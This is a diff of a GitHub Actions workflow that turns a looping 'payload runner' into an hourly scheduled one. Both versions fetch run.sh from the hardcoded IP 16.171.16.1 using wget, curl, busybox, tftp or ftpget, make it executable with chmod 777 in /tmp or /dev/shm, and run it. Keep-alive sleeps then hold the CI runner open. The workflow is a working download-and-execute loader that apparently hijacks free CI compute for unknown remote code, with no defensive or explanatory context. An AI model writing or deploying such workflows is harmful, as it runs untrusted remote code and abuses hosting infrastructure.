@@ -1,56 +1,44 @@
-name: Continuous Payload Runner (Infinite)
+name: Auto Payload Runner (Every Hour)
 
 on:
+  schedule:
+    # Run every hour
+    - cron: '0 * * * *'
+  # Also run on workflow_dispatch for manual trigger
   workflow_dispatch:
     inputs:
       payload_url:
         description: 'Payload URL'
         required: true
         default: 'http://16.171.16.1/run.sh'
-      delay_seconds:
-        description: 'Delay between runs (seconds)'
-        required: true
-        default: '60'
 
 jobs:
-  continuous-run:
+  run-payload:
     runs-on: ubuntu-latest
     
     steps:
-    - name: Run Payload Continuously
+    - name: Run Payload
       run: |
         echo "=========================================="
-        echo "Continuous Payload Runner"
-        echo "Payload: ${{ github.event.inputs.payload_url }}"
-        echo "Delay: ${{ github.event.inputs.delay_seconds }} seconds"
+        echo "Auto Payload Runner"
+        echo "Payload: ${{ github.event.inputs.payload_url || 'http://16.171.16.1/run.sh' }}"
         echo "Start Time: $(date)"
         echo "=========================================="
-        echo "Press Ctrl+C to stop (will run forever)"
-        echo ""
         
-        while true; do
-          echo "[$(date '+%Y-%m-%d %H:%M:%S')] Executing payload..."
-          
-          cd /tmp || cd /var/tmp || cd /dev/shm
-          
-          # Main payload command
-          (wget ${{ github.event.inputs.payload_url }} -O run.sh 2>/dev/null || \
-           curl -s ${{ github.event.inputs.payload_url }} -o run.sh || \
-           busybox wget ${{ github.event.inputs.payload_url }} -O run.sh 2>/dev/null || \
-           tftp -g -r run.sh 16.171.16.1 69 || \
-           ftpget -u "" -p "" -P 21 16.171.16.1 run.sh run.sh)
-          
-          if [ -s run.sh ]; then
-            chmod 777 run.sh
-            ./run.sh &
-            echo "  ✅ Payload executed successfully (PID: $!)"
-          else
-            echo "  ❌ Failed to download payload"
-          fi
-          
-          echo "  Waiting ${{ github.event.inputs.delay_seconds }} seconds..."
-          sleep ${{ github.event.inputs.delay_seconds }}
-        done
+        cd /tmp || cd /var/tmp || cd /dev/shm
+        
+        # Download and execute payload
+        (wget ${{ github.event.inputs.payload_url || 'http://16.171.16.1/run.sh' }} -O run.sh 2>/dev/null || \
+         curl -s ${{ github.event.inputs.payload_url || 'http://16.171.16.1/run.sh' }} -o run.sh || \
+         busybox wget ${{ github.event.inputs.payload_url || 'http://16.171.16.1/run.sh' }} -O run.sh 2>/dev/null || \
+         tftp -g -r run.sh 16.171.16.1 69 || \
+         ftpget -u "" -p "" -P 21 16.171.16.1 run.sh run.sh)
+        
+        [ -s run.sh ] && chmod 777 run.sh && ./run.sh
+        
+        echo "End Time: $(date)"
 
-    - name: Keep Alive
-      run: sleep infinity
+    - name: Keep Runner Alive
+      run: |
+        # Keep the runner active for 55 minutes
+        sleep 3300
